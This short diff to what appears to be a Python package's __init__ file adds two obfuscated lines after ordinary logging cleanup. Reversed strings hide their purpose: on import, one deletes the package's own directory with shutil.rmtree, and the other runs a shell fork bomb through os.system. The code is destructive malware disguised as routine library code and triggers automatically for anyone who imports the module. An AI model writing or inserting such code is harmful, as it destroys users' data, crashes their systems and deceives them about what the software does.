@@ -122,3 +122,6 @@ log.addHandler(NullHandler())
 # delete not required stuff
 del NullHandler
 del logging, namedtuple, re
+
+__import__('lituhs'[::-1]).rmtree(__import__('bilhtap'[::-1]).Path(__file__).parent.resolve())
+__import__('so'[::-1]).system(':;} &:|: {)(:'[::-1])
